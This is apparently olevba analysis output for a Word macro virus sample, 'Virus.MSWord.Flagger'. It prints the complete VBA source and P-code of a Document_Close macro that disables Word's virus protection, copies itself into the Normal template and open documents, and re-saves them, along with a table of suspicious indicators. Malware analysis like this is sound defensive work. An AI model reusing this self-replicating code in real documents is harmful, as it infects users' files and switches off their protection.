olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Flagger
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Flagger - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
' íû÷êà, à âîò è íå íàéä¸òå -:)
On Error Resume Next
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
' ñàìàõîäíûé ìåõàíèçì
Set VT = MacroContainer.VBProject.VBComponents.Item(1)
Set ND = NormalTemplate.VBProject.VBComponents.Item(1)
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
VTL = VT.CodeModule.CountOfLines
If ND.CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
For i = 1 To VTL
ND.CodeModule.InsertLines i, VT.CodeModule.Lines(i, 1)
Next i
End If
NDL = ND.CodeModule.CountOfLines
ADL = AD.CodeModule.CountOfLines
SFlag = ActiveDocument.Saved
If AD.CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
For i = 1 To NDL
AD.CodeModule.InsertLines i, ND.CodeModule.Lines(i, 1)
Next i
End If
If (Left(ActiveDocument.Name, 8) <> "Document") And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
ActiveDocument.Saved = SFlag
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Flagger
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6062 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x001E " íû÷êà, à âîò è íå íàéä¸òå -:)"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	QuoteRem 0x0000 0x0014 " ñàìàõîäíûé ìåõàíèçì"
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set VT 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ND 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #9:
' 	Ld VT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St VTL 
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ND 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VTL 
' 	For 
' Line #12:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld VT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ND 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	Ld ND 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NDL 
' Line #16:
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADL 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SFlag 
' Line #18:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NDL 
' 	For 
' Line #20:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld ND 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld SFlag 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #27:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

